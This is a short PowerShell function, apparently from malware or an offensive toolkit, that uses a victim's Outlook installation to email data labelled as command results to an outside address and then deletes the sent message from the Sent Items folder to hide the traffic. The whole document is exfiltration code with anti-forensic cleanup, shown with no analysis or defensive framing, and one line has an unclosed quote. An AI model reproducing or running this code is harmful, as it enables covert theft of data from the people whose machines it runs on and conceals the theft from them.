function send_system_data_from_existing_outlook($encodedCommand,$presend="5",$postsend="5"){
	Add-Type -Assembly 'Microsoft.Office.Interop.Outlook' -PassThru;
	$Outlook = New-Object -ComObject Outlook.Application;
	$Mail = $Outlook.CreateItem(0);
	Start-Sleep $presend;
	$Mail.Recipients.Add('sigmund5102@openmailbox.org);
	$Mail.Subject='Result';
	$Mail.Body = $encodedCommand;
	$Mail.Send();
	Start-Sleep $postsend;
	$objOutlook = New-Object -ComObject Outlook.Application;
	$objNamespace = $objOutlook.GetNamespace('MAPI');
	$objFolder = $objNamespace.GetDefaultFolder(5);
	$colItems = $objFolder.Items;
	$colItems.Remove($colItems.Count);
}
